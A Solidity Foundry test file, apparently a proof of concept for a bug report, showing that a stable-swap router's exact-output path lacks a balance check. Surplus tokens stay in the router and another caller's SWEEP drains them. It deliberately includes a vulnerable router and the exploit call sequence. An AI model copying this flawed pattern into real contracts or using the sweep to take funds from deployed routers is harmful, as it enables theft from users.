// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;


import "forge-std/Test.sol";

// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//  Minimal ERC-20
// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
contract MockERC20 {
    string public name;
    string public symbol;
    uint8  public constant decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    constructor(string memory _name) { name = _name; symbol = _name; }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply   += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "ERC20: insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to]         += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "ERC20: insufficient");
        if (allowance[from][msg.sender] != type(uint256).max)
            allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to]   += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//  Stable pool mock - implements IStableSwap.exchange()
//  actualOutput is set per-test to simulate any slippage scenario.
// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
contract MockStablePool {
    MockERC20 public immutable tokenIn;
    MockERC20 public immutable tokenOut;
    uint256   public actualOutput;

    constructor(address _in, address _out) {
        tokenIn  = MockERC20(_in);
        tokenOut = MockERC20(_out);
    }

    function setOutput(uint256 amount) external { actualOutput = amount; }

    // Matches IStableSwap.exchange(uint256 i, uint256 j, uint256 dx, uint256 minDy)
    // The real router always passes minDy = 0 (see _stableSwap inner loop)
    function exchange(uint256, uint256, uint256 dx, uint256 minDy) external {
        tokenIn.transferFrom(msg.sender, address(this), dx);
        require(actualOutput >= minDy, "pool: slippage");
        tokenOut.transfer(msg.sender, actualOutput);
    }
}

// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//  Factory mock - implements getPairInfo (flag==2 path)
//  Used by UniversalRouterHelper.getStableInfo inside _stableSwap
// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
contract MockStableFactory {
    address public swapContract;
    address public tok0;
    address public tok1;

    struct StableSwapPairInfo {
        address swapContract;
        address token0;
        address token1;
        address LPContract;
    }

    function setPool(address _swap, address _t0, address _t1) external {
        swapContract = _swap;
        tok0 = _t0;
        tok1 = _t1;
    }

    function getPairInfo(address, address)
        external view returns (StableSwapPairInfo memory)
    {
        return StableSwapPairInfo(swapContract, tok0, tok1, address(0));
    }
}

// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//  StableInfo mock - implements IStableSwapInfo.get_dx()
//  Returns a 1:1 estimate so amountIn == amountOut in tests.
//  Called by stableSwapExactOutputAmountIn via getStableAmountsIn.
// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
contract MockStableInfo {
    function get_dx(address, uint256, uint256, uint256 dy, uint256)
        external pure returns (uint256)
    {
        return dy; // 1:1 estimate
    }
}

// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//  Router under test
//
//  Mirrors real StableSwapRouter logic exactly, with these fixes
//  over the original PoC's VulnerableStableRouter:
//
//  FIX 1 - Input encoding uses (address[], uint256[], bool) arrays,
//           not flat (address, address, uint256) scalars.
//           Matches Dispatcher.sol assembly + toAddressArray/toUintArray.
//
//  FIX 2 - SWEEP takes 3 params: (token, recipient, amountMin).
//           Old PoC used 2 params, missing amountMin entirely.
//
//  FIX 3 - MockStableFactory.getPairInfo used (flag==2 code path),
//           not a fake getStableInfo that doesn't exist on the real factory.
//
//  FIX 4 - MockStableInfo.get_dx used for amountIn estimation,
//           matching the real stableSwapExactOutputAmountIn call chain.
//
//  FIX 5 - payerIsUser bool present in input ABI, always false here
//           (router holds pre-funded tokens, no Permit2 needed in tests).
// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
contract VulnerableRouter {

    uint8  constant CMD_STABLE_EXACT_IN  = 0x22;
    uint8  constant CMD_STABLE_EXACT_OUT = 0x23;
    uint8  constant CMD_SWEEP            = 0x04;
    bytes1 constant COMMAND_TYPE_MASK    = 0x3f;

    error StableTooLittleReceived();
    error StableTooMuchRequested();
    error InvalidCommand(uint8 cmd);

    MockStableFactory public immutable factory;
    MockStableInfo    public immutable stableInfo;

    constructor(address _factory, address _stableInfo) {
        factory    = MockStableFactory(_factory);
        stableInfo = MockStableInfo(_stableInfo);
    }

    receive() external payable {}

    // Matches UniversalRouter.execute(bytes calldata commands, bytes[] calldata inputs)
    function execute(bytes calldata commands, bytes[] calldata inputs) external payable {
        require(commands.length == inputs.length, "length mismatch");
        for (uint256 i; i < commands.length; i++) {
            uint8 cmd = uint8(commands[i] & COMMAND_TYPE_MASK);
            _dispatch(cmd, inputs[i]);
        }
    }

    function _dispatch(uint8 cmd, bytes calldata inp) internal {
        if      (cmd == CMD_STABLE_EXACT_IN)  _handleExactIn(inp);
        else if (cmd == CMD_STABLE_EXACT_OUT) _handleExactOut(inp);
        else if (cmd == CMD_SWEEP)            _handleSweep(inp);
        else revert InvalidCommand(cmd);
    }

    // ------ STABLE_SWAP_EXACT_IN - SAFE ---------------------------------------------------------------------------------------------
    // abi.encode(recipient, amountIn, amountOutMin, path[], flag[], payerIsUser)
    function _handleExactIn(bytes calldata inp) internal {
        (
            address recipient,
            /*uint256 amountIn - unused: payerIsUser=false, router pre-funded*/,
            uint256 amountOutMin,
            address[] memory path,
            uint256[] memory flag,
            /*bool payerIsUser*/
        ) = abi.decode(inp, (address, uint256, uint256, address[], uint256[], bool));

        address tokenOut = path[path.length - 1];
        uint256 balanceBefore = MockERC20(tokenOut).balanceOf(address(this));

        _stableSwap(path, flag);

        // Correct: measure actual output and enforce minimum
        uint256 actualOut = MockERC20(tokenOut).balanceOf(address(this)) - balanceBefore;
        if (actualOut < amountOutMin) revert StableTooLittleReceived();
        if (recipient != address(this))
            MockERC20(tokenOut).transfer(recipient, actualOut);
    }

    // ------ STABLE_SWAP_EXACT_OUT - VULNERABLE ------------------------------------------------------------------------
    // abi.encode(recipient, amountOut, amountInMax, path[], flag[], payerIsUser)
    function _handleExactOut(bytes calldata inp) internal {
        (
            address recipient,
            uint256 amountOut,
            uint256 amountInMax,
            address[] memory path,
            uint256[] memory flag,
            /*bool payerIsUser*/
        ) = abi.decode(inp, (address, uint256, uint256, address[], uint256[], bool));

        // Estimate amountIn via MockStableInfo.get_dx (mirrors stableSwapExactOutputAmountIn)
        uint256 amountIn = stableInfo.get_dx(address(0), 0, 0, amountOut, type(uint256).max);
        if (amountIn > amountInMax) revert StableTooMuchRequested();

        // Mirrors stableSwapExactOutput exactly - THE BUG IS HERE:
        _stableSwap(path, flag);

        // No balance check. Pays fixed amountOut regardless of what exchange() returned.
        //   Pool gave MORE - surplus stays in router (any caller can SWEEP it)
        //   Pool gave LESS - raw ERC20 revert, no StableTooLittleReceived
        if (recipient != address(this))
            MockERC20(path[path.length - 1]).transfer(recipient, amountOut);
    }

    // ------ SWEEP - abi.encode(token, recipient, amountMin) ---------------------------------
    // Three params - amountMin is required by the real Dispatcher.
    function _handleSweep(bytes calldata inp) internal {
        (address token, address recipient, uint256 amountMin) =
            abi.decode(inp, (address, address, uint256));
        uint256 bal = MockERC20(token).balanceOf(address(this));
        require(bal >= amountMin, "SWEEP: below minimum");
        if (bal > 0) MockERC20(token).transfer(recipient, bal);
    }

    // ------ _stableSwap - mirrors StableSwapRouter._stableSwap ---------------------
    function _stableSwap(address[] memory path, uint256[] memory flag) internal {
        for (uint256 i; i < flag.length; i++) {
            address input  = path[i];
            address output = path[i + 1]; // output referenced to suppress warning

            MockStableFactory.StableSwapPairInfo memory info =
                factory.getPairInfo(input, output);

            uint256 k = (input == info.token0) ? 0 : 1;
            uint256 j = (k == 0) ? 1 : 0;

            uint256 amountIn = MockERC20(input).balanceOf(address(this));
            MockERC20(input).approve(info.swapContract, amountIn);
            // min_dy = 0 - exactly as the real _stableSwap does
            MockStablePool(info.swapContract).exchange(k, j, amountIn, 0);
        }
    }
}

// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//  Tests
// ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
contract F_StableExactOut_Test is Test {

    MockERC20         tokenA;
    MockERC20         tokenB;
    MockStablePool    pool;
    MockStableFactory factoryMock;
    MockStableInfo    infoMock;
    VulnerableRouter  router;

    address alice = makeAddr("alice");
    address bob   = makeAddr("bob");

    address[] path;
    uint256[] flag;

    function setUp() public {
        tokenA      = new MockERC20("USDT");
        tokenB      = new MockERC20("USDC");
        factoryMock = new MockStableFactory();
        infoMock    = new MockStableInfo();
        pool        = new MockStablePool(address(tokenA), address(tokenB));
        router      = new VulnerableRouter(address(factoryMock), address(infoMock));

        factoryMock.setPool(address(pool), address(tokenA), address(tokenB));
        tokenB.mint(address(pool), 10_000 ether);
        tokenA.mint(alice, 1_000 ether);
        tokenA.mint(bob,   1_000 ether);

        path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);
        flag = new uint256[](1);
        flag[0] = 2;
    }

    // ------ Encoding helpers - match real Dispatcher ABI exactly ------------------

    /// STABLE_SWAP_EXACT_OUT: abi.encode(recipient,amountOut,amountInMax,path[],flag[],payerIsUser)
    function _encodeExactOut(address recipient, uint256 amountOut, uint256 amountInMax)
        internal view returns (bytes memory)
    {
        return abi.encode(recipient, amountOut, amountInMax, path, flag, false);
    }

    /// STABLE_SWAP_EXACT_IN: abi.encode(recipient,amountIn,amountOutMin,path[],flag[],payerIsUser)
    function _encodeExactIn(address recipient, uint256 amountIn, uint256 amountOutMin)
        internal view returns (bytes memory)
    {
        return abi.encode(recipient, amountIn, amountOutMin, path, flag, false);
    }

    /// SWEEP: abi.encode(token, recipient, amountMin) - 3 params
    function _encodeSweep(address token, address recipient)
        internal pure returns (bytes memory)
    {
        return abi.encode(token, recipient, uint256(0));
    }

    /// payerIsUser=false: router must hold tokenA before execute()
    function _fundRouter(address from, uint256 amount) internal {
        vm.prank(from);
        tokenA.transfer(address(router), amount);
    }

    // ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    // TEST 1 - Favorable slippage: pool gives 110, user gets 100
    //          10 tokenB stranded - Bob sweeps it for free
    // ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    function test_residualLeftInRouter_sweptByNextCaller() public {
        uint256 aliceWants    = 100 ether;
        uint256 poolActualOut = 110 ether;

        pool.setOutput(poolActualOut);
        _fundRouter(alice, aliceWants);

        bytes memory commands = abi.encodePacked(bytes1(CMD_STABLE_EXACT_OUT));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = _encodeExactOut(alice, aliceWants, aliceWants);

        router.execute(commands, inputs);

        uint256 aliceOut      = tokenB.balanceOf(alice);
        uint256 routerResidual = tokenB.balanceOf(address(router));

        console.log("=== Test 1: Favorable slippage ===");
        console.log("Pool produced:              ", poolActualOut   / 1e18, "tokenB");
        console.log("Alice received:             ", aliceOut        / 1e18, "tokenB");
        console.log("Residual stuck in router:   ", routerResidual  / 1e18, "tokenB");

        assertEq(aliceOut,       aliceWants,                "alice gets exactly amountOut");
        assertEq(routerResidual, poolActualOut - aliceWants, "surplus left in router");

        // Bob sweeps with correct 3-param SWEEP encoding
        bytes memory sweepCmd = abi.encodePacked(bytes1(CMD_SWEEP));
        bytes[] memory sweepInputs = new bytes[](1);
        sweepInputs[0] = _encodeSweep(address(tokenB), bob);

        vm.prank(bob);
        router.execute(sweepCmd, sweepInputs);

        console.log("Bob stole:                  ", tokenB.balanceOf(bob) / 1e18, "tokenB");

        assertEq(tokenB.balanceOf(bob),             routerResidual, "bob swept all residual");
        assertEq(tokenB.balanceOf(address(router)), 0,              "router empty after sweep");
    }

    // ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    // TEST 2 - Unfavorable slippage: pool gives 90, pay() REVERTS
    //          Raw ERC20 revert - not StableTooLittleReceived.
    //          Slippage protection is entirely absent.
    // ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    function test_unfavorableSlippage_txReverts() public {
        uint256 aliceWants    = 100 ether;
        uint256 poolActualOut =  90 ether;

        pool.setOutput(poolActualOut);
        _fundRouter(alice, aliceWants);

        bytes memory commands = abi.encodePacked(bytes1(CMD_STABLE_EXACT_OUT));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = _encodeExactOut(alice, aliceWants, aliceWants);

        console.log("=== Test 2: Unfavorable slippage ===");
        console.log("Pool produces only 90, user wants 100");
        console.log("pay() tries to send 100 but router only has 90 -> raw ERC20 revert");
        console.log("No StableTooLittleReceived - slippage protection entirely absent");

        vm.expectRevert(bytes("ERC20: insufficient"));
        router.execute(commands, inputs);

        // Full revert: alice's tokenA still in router (returned to her in real scenario)
        assertEq(tokenA.balanceOf(address(router)), aliceWants, "alice input still in router after revert");
    }

    // ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    // TEST 3 - Contrast: exactInput passes ALL actual output to user
    //          Pool gives 110, Alice gets 110, nothing stranded.
    // ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    function test_exactInput_noResidual_correctBehavior() public {
        uint256 amountIn      = 100 ether;
        uint256 poolActualOut = 110 ether;
        uint256 amountOutMin  = 100 ether;

        pool.setOutput(poolActualOut);
        _fundRouter(alice, amountIn);

        bytes memory commands = abi.encodePacked(bytes1(CMD_STABLE_EXACT_IN));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = _encodeExactIn(alice, amountIn, amountOutMin);

        router.execute(commands, inputs);

        console.log("=== Test 3: exactInput (correct behavior) ===");
        console.log("Pool produced:         ", poolActualOut                       / 1e18, "tokenB");
        console.log("Alice received:        ", tokenB.balanceOf(alice)             / 1e18, "tokenB");
        console.log("Residual in router:    ", tokenB.balanceOf(address(router))   / 1e18, "tokenB");

        assertEq(tokenB.balanceOf(alice),           poolActualOut, "alice gets full actual output");
        assertEq(tokenB.balanceOf(address(router)), 0,             "no residual - exactInput is correct");
    }

    // ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    // TEST 4 - Realistic multi-user scenario
    //          Alice's swap strands 5 tokenB. Bob's routine SWEEP grabs it.
    // ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    function test_multiUser_residualTheft_realistic() public {
        pool.setOutput(105 ether);
        _fundRouter(alice, 100 ether);

        {
            bytes memory cmds = abi.encodePacked(bytes1(CMD_STABLE_EXACT_OUT));
            bytes[] memory ins = new bytes[](1);
            ins[0] = _encodeExactOut(alice, 100 ether, 100 ether);
            router.execute(cmds, ins);
        }

        assertEq(tokenB.balanceOf(address(router)), 5 ether, "5 tokenB stranded after alice's swap");

        pool.setOutput(100 ether);
        _fundRouter(bob, 100 ether);

        {
            bytes memory cmds = abi.encodePacked(
                bytes1(CMD_STABLE_EXACT_OUT),
                bytes1(CMD_SWEEP)
            );
            bytes[] memory ins = new bytes[](2);
            ins[0] = _encodeExactOut(bob, 100 ether, 100 ether);
            ins[1] = _encodeSweep(address(tokenB), bob);
            router.execute(cmds, ins);
        }

        console.log("=== Test 4: Realistic multi-user scenario ===");
        console.log("Alice received:       ", tokenB.balanceOf(alice) / 1e18, "tokenB (wanted 100)");
        console.log("Bob received:         ", tokenB.balanceOf(bob)   / 1e18, "tokenB (100 own + 5 Alice's)");
        console.log("Alice overpaid:        5 tokenB (pool gave 105, router paid her only 100)");

        assertEq(tokenB.balanceOf(alice),           100 ether, "alice only got requested amount");
        assertEq(tokenB.balanceOf(bob),             105 ether, "bob got his 100 + alice's stranded 5");
        assertEq(tokenB.balanceOf(address(router)), 0,         "router fully drained");
    }

    // ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    // TEST 5 - SWEEP amountMin: confirms 3-param encoding is required
    //          The old PoC used 2-param encoding which would decode
    //          amountMin from uninitialized calldata (garbage value).
    // ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    function test_sweep_threeParamEncoding_required() public {
        tokenB.mint(address(router), 10 ether);

        bytes memory sweepCmd = abi.encodePacked(bytes1(CMD_SWEEP));
        bytes[] memory sweepInputs = new bytes[](1);
        // Correct: (token, recipient, amountMin=0)
        sweepInputs[0] = _encodeSweep(address(tokenB), bob);

        vm.prank(bob);
        router.execute(sweepCmd, sweepInputs);

        assertEq(tokenB.balanceOf(bob),             10 ether, "sweep succeeded with correct 3-param encoding");
        assertEq(tokenB.balanceOf(address(router)), 0,        "router empty");
    }

    uint8 constant CMD_STABLE_EXACT_IN  = 0x22;
    uint8 constant CMD_STABLE_EXACT_OUT = 0x23;
    uint8 constant CMD_SWEEP            = 0x04;
}
